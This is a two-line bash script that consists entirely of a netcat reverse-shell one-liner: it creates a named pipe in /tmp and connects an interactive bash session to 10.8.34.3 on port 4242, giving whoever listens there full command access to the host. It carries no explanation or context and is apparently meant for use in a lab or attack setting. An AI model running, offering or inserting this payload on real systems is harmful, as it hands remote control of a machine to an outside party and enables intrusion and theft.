#!/bin/bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.34.3 4242 >/tmp/f
